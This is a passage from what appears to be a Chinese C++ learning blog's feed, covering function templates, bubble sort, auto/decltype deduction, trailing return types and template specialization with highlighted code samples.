class="type">int</span> <span class="title">pj</span><span class="params">(<span class="type">int</span> *p,<span class="type">int</span> count)</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果传递指针，还要带上长度，会很麻烦</span></span><br><span class="line"><span class="comment">//int pj(int ch[])&#123;&#125; 这种就更没法用了。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pj</span><span class="params">(<span class="type">int</span> (&amp;ch)[<span class="number">5</span>])</span></span>&#123;&#125; <span class="comment">//指定的话也会很尴尬，效果跟之前的差不多</span></span><br></pre></td></tr></table></figure><p>但是利用模板，可以让长度达到自适应效果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T,<span class="type">short</span> count&gt;</span></span><br><span class="line"><span class="function">T <span class="title">Ave</span><span class="params">(T(&amp;arry)[count])</span></span>&#123;</span><br><span class="line">T ary&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> x:arry)&#123;</span><br><span class="line">ary += x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ary / count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/08/function9/003.png" class=""><p>可以看到传参的时候都不需要用,分隔长度。这也是因为模板自动推敲出了count这个长度的参数</p><blockquote><p>但是不足之处是对于char类型数组，毕竟T是模板，当返回值是一个char类型的值打印出来就很怪。</p></blockquote><hr><h3 id="模板排序大法"><a href="#模板排序大法" class="headerlink" title="模板排序大法"></a>模板排序大法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T,<span class="type">unsigned</span> count&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sort</span><span class="params">(T(&amp;ary)[count])</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> j = <span class="number">0</span>; j &lt; count - i - <span class="number">1</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (ary[j] &gt; ary[j + <span class="number">1</span>])&#123;</span><br><span class="line">T tmp = ary[j];</span><br><span class="line">ary[j] = ary[j + <span class="number">1</span>];</span><br><span class="line">ary[j + <span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//本质上算不得什么，但是通过结合学习，可以做成这样的模板也挺好的，既可以忽略数组个数，也能自适应</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">6</span>]&#123; <span class="number">15</span>,<span class="number">48</span>,<span class="number">11</span>,<span class="number">42</span>,<span class="number">100</span>,<span class="number">20</span> &#125;;</span><br><span class="line"><span class="type">short</span> a1[<span class="number">5</span>]&#123; <span class="number">1</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">20</span> &#125;;</span><br><span class="line"><span class="built_in">Sort</span>(a);</span><br><span class="line"><span class="built_in">Sort</span>(a1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> x : a) std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> x : a1)std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/08/function9/004.png" class=""><p>效果如图，算法采用冒泡，因为写法好记。。。怎么理解冒泡找视频有动画排序的过程加深理解。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ul><li>模板 会根据 类型生成不同的函数重载 ： 详情见debug 调用两个不同类型的函数 看call 函数时内存地址</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br></pre></td></tr></table></figure><p>模板其实还有一种声明类为参数的方式，但是这里目前还是处于面向过程就等后面做到模板类在回顾。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function8-auto/decltype</title>
      <link href="/2022/06/06/function8/"/>
      <url>/2022/06/06/function8/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>c++ 11:</p><ul><li>auto-&gt;decltype</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>auto是一种自动推导的类型，之前学过但是用的比较少。<br>主要也是c++不像java吧，java这种后端项目好像即使大版本更新了，项目也不会主动去换jdk。<br>c++稍微自由一点，听过的感觉都逐步靠近新版本，但肯定不是绝对，毕竟旧项目不考虑升级单纯维护的话也用不到那么新的。</p><p>auto好像还是c++11有的，c++14之后对auto又提供了什么也还不知道。</p><p>既然可以自动推导，那么可以用来定义变量或者函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> a = <span class="number">123</span>; <span class="comment">//等价与 int a = 123; auto定义的时候必须有初值，否则无法确定类型，无法确定类型也就无法确定大小。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    等价于</span></span><br><span class="line"><span class="comment">    int ave(int a, int b)&#123;</span></span><br><span class="line"><span class="comment">        return a + b;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>但是这两种使用场景并不是auto最恰当的用法，不管是函数或者变量，其实不推荐auto去推导来声明</strong></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>自动推导的基础就是有关键信息，当信息不够的时候auto也无能为力。<br>同时auto肯定有缺点：</p><ol><li>auto不能保留const属性<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a&#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> c = a;</span><br><span class="line"><span class="comment">//c只会是int，而非const</span></span><br></pre></td></tr></table></figure></li><li>auto优先推导为值类型，而不是引用<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> &amp;b = a;</span><br><span class="line"><span class="keyword">auto</span> c = a;</span><br><span class="line"><span class="comment">//c为int类型，而不是const&amp;</span></span><br></pre></td></tr></table></figure></li><li>auto利用返回值确定类型的时候会执行函数。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> x = <span class="built_in">ave</span>(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//类型将由函数返回值而定</span></span><br></pre></td></tr></table></figure></li></ol><hr><p>其实默认情况下还是需要自己推导的，不过最新的intellisense自动推导类型了<br>源代码应该是这样的没啥特殊：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">toMax</span><span class="params">(<span class="type">int</span> &amp;a, <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>intellisense自动推导后：<img src="/2022/06/06/function8/000.png" class=""><br>有好处也有坏处，好处自然省了推导，坏处就是自己不能推导了，虽然有点废话文学但是无关紧要你可以关掉。</p><p>当然前面也说了auto的缺点，所以我们指定类型：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">toMax</span><span class="params">(<span class="type">int</span> &amp;a, <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>传递是引用，返回也是引用，那么返回的引用就是谁大的结果。</p></blockquote><p>实际调用的时候还能玩一收骚操作：<code>toMax(a, b) = 500;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">150</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">toMax</span>(a, b) = <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>找个样例测试一下：<img src="/2022/06/06/function8/001.png" class=""><br>有意思，发现b的值果然被修改了。</p><p>再回头想一想auto是否能这么做?</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">toMax</span><span class="params">(<span class="type">int</span> &amp;a, <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">150</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line">    <span class="built_in">toMax</span>(a, b) = <span class="number">500</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>显然是不可以的，因为之前就说过，auto优先推断类型为值类型传递。<br>也就是先前截的图，auto的时候intellisense自动推导了类型是int类型的返回值，既然是int类型那么修改肯定就不合法了，因为返回的是一个值，而不是一个变量。</p></blockquote><p>当然这样一搞，显得auto很呆，所以后面的标准又加入了新的讨论：拖尾函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">toMax</span><span class="params">(<span class="type">int</span> &amp;a, <span class="type">int</span> &amp;b)</span>-&gt;<span class="type">int</span>&amp;</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/06/function8/002.png" class=""><p>能看到编译器在形式上通过了这种写法。不过具体用处在这还体现不出来要等以后再看。</p><hr><h2 id="decltype"><a href="#decltype" class="headerlink" title="decltype"></a>decltype</h2><p>这玩意怎么说呢，通过一个表达式去获得类型，比如说：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a&#123;&#125;;</span><br><span class="line"><span class="type">float</span> b&#123;&#125;;</span><br><span class="line"><span class="keyword">decltype</span>(a-b) c;    <span class="comment">//c就向float靠齐了</span></span><br></pre></td></tr></table></figure><blockquote><p>如果表达式只是一个变量，那么推断类型就为该变量的类型。<br>减法是要看隐式转换的条件，或者说等级。<br>或许这样粗看感觉还不如auto</p></blockquote><p><strong>但是，decltype可以保留const和引用类型！</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a&#123;&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b&#123;&#125;;</span><br><span class="line"><span class="type">int</span> &amp;la &#123;a&#125;;</span><br><span class="line"><span class="type">int</span> *p &#123;&amp;a&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decltype(a) x;    -&gt; 相当于 int x</span></span><br><span class="line"><span class="comment">//decltype(b) x;    -&gt; 相当于 const int x</span></span><br><span class="line"><span class="comment">//decltype(la) x;   -&gt; 相当于 int &amp;x</span></span><br><span class="line"><span class="comment">//decltype(p) x;    -&gt; 相当于 int *x</span></span><br></pre></td></tr></table></figure><p>这简直就是哦买噶~</p><p>但是还有一种经历运算之后的操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//原则上是根据运算结果是否有固定的内存地址，也就是左值。</span></span><br><span class="line"><span class="comment">//如果有固定的内存地址类如指针 推导的类型就为该类型的引用类型</span></span><br><span class="line"><span class="comment">//如果没有固定的内存地址，则推导的类型就为该结果的类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">decltype</span>(a+b);  <span class="comment">// -&gt; 相当于 int x</span></span><br><span class="line"><span class="keyword">decltype</span>(*p);   <span class="comment">// -&gt; 相当于 int &amp;x，*号其实也是一种间接的运算符</span></span><br><span class="line"><span class="keyword">decltype</span>(p[<span class="number">0</span>]); <span class="comment">// -&gt; 相当于 int &amp;x</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这样说可能有点绕，自己多敲几个看看得到的是什么类型的变量</p></blockquote><p>然后还有一种比较简单的就是根据函数返回值来确定：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">decltype</span>(<span class="built_in">ave</span>(<span class="number">100</span>,<span class="number">200</span>)) x;   <span class="comment">//-&gt;显然是int类型</span></span><br></pre></td></tr></table></figure><p><strong>但是注意decltype不会执行函数，只会通过数据类型去猜，而auto是会去执行函数的</strong></p><img src="/2022/06/06/function8/003.png" class=""><hr><h2 id="auto-gt-decltype"><a href="#auto-gt-decltype" class="headerlink" title="auto-&gt;decltype"></a>auto-&gt;decltype</h2><p>已经知道decltype套函数的时候不会调用，而且decltype可以推导const和引用等类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">toMax</span><span class="params">(<span class="type">int</span> &amp;a, <span class="type">int</span> &amp;b)</span>-&gt;<span class="type">int</span>&amp;</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种直白的写法可以说拜拜！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">toMax</span><span class="params">(<span class="type">int</span> &amp;a, <span class="type">int</span> &amp;b)</span>-&gt;<span class="title">decltype</span><span class="params">(a &gt; b ? a : b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这样的推导是求出了引用的类型，但是写法上好似有重复，又有点累赘。</p><p>所以在<code>c++ 14</code>以后引入了新的写法，上述的写法是基于<code>c++11</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">decltype</span>(<span class="keyword">auto</span>) <span class="title">toMax</span><span class="params">(<span class="type">int</span> &amp;a, <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种写法就可以不使用拖尾函数了，但是编译器要支持<code>c++14</code>所以用这种写法要注意。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>自动推导感觉。。还是慎用吧，除非你很严谨，不然到时候找翻天了。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function7-模板</title>
      <link href="/2022/06/05/function7/"/>
      <url>/2022/06/05/function7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>重载回顾完之后<br>虽然说让一个函数名有了多个功能，但是每次都要多写一个函数还是挺麻烦的。<br>而模板功能是为了提升复用性的功能。</p><span id="more"></span><hr><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>关键字：</p><ul><li>template</li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Ave</span><span class="params">(<span class="type">float</span> a, <span class="type">float</span> b, <span class="type">float</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如有这么个函数是求三个数的平均值，抛开类型，算法逻辑是相同的操作。重载也合理。<br>但是如果要对每一个类型都写一个这样的函数，就会变得很麻烦。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> type&gt; <span class="function">type <span class="title">Ave</span><span class="params">(type a, type b, type c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//或者template声明完模板后换行写也可以</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> type&gt; </span><br><span class="line"><span class="function">type <span class="title">Ave</span><span class="params">(type a, type b, type c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>typename 后面跟的名称就像是自定义的关键词auto一般，后面写的函数使用这个变量名，就代表他是这个类型的函数</strong></p><p>使用起来也很方便：<img src="/2022/06/05/function7/000.png" class=""><br>char类型也没问题，你用什么类型的参数他就会返回什么类型的值：<img src="/2022/06/05/function7/001.png" class=""></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> type&gt; </span><br><span class="line"><span class="function">type <span class="title">Ave</span><span class="params">(type a, type b, type c)</span></span>&#123;</span><br><span class="line">    type x = a + b;</span><br><span class="line">    type ch[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>既然说type是一个类型名，那么其实也可以在模板里面用它来定义变量。<br>甚至引用或者指针也ok。</p></blockquote><hr><h2 id="指定模板类型"><a href="#指定模板类型" class="headerlink" title="指定模板类型"></a>指定模板类型</h2><p>既然模板可以自适应，又为啥会用到指定？原因也就是形参类型不一的时候，没法主动去转换，需要人为干预。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> type&gt; </span><br><span class="line"><span class="function">type <span class="title">Ave</span><span class="params">(type a, type b, type c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b + c) / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">26</span>, <span class="number">78.9f</span>, <span class="number">25.8f</span>) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当参数不一致的时候：<img src="/2022/06/05/function7/002.png" class=""> 编译器就会给出错误提示<br><code>std::cout &lt;&lt; Ave&lt;int&gt;(26, 78.9f, 25.8f) &lt;&lt; std::endl;</code>当指定类型之后：</p><img src="/2022/06/05/function7/003.png" class=""><p>能看到这个函数模板就变成int的类型的函数了。</p><hr><h2 id="指针引用"><a href="#指针引用" class="headerlink" title="指针引用"></a>指针引用</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">toMax</span><span class="params">(T a, T b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/05/function7/004.png" class=""><p>可看到被实例化成int*类型的函数了，但其实传递地址没有进行很好的处理，所以指很有可能是错的。</p><img src="/2022/06/05/function7/005.png" class=""><p>可当传递是引用时，发现并没有实例化成引用类型，而是普通的int类型。</p><p>而且const好像也不当回事：</p><img src="/2022/06/05/function7/006.png" class=""><hr><h1 id="函数模板重载"><a href="#函数模板重载" class="headerlink" title="函数模板重载"></a>函数模板重载</h1><p>在经过一些例子尝试后，发现模板对于普通的类型转换是没有问题的，但是对于指针相关的操作可能就会有点不灵清。</p><img src="/2022/06/05/function7/007.png" class=""><p>就拿之前指针的问题，返回值甚至不是大的一方，只是单纯的返回了a。</p><p>解决的方法就是针对模板之外的情况附带一个指定的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">toMax</span><span class="params">(T a, T b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="function"><span class="type">int</span> *<span class="title">toMax</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *a &gt; *b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/05/function7/008.png" class=""><p>可以看到输出正常了，也匹配到了后面指针那个模板:</p><img src="/2022/06/05/function7/009.png" class=""><p><strong>但是倒霉的又来了，我们这里的指针函数是int类型的，就失去了模板之前自动根据参数识别的情况，但是可以用函数重载去弥补一些损失</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">toMax</span><span class="params">(T a, T b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> *<span class="title">toMax</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *a &gt; *b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> *<span class="title">toMax</span><span class="params">(<span class="type">float</span> *a, <span class="type">float</span> *b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *a &gt; *b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重载的时候就到了，不过要记住优先级，<strong>函数重载的优先级大于函数模板</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">toMax</span><span class="params">(T a, T b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">toMax</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> 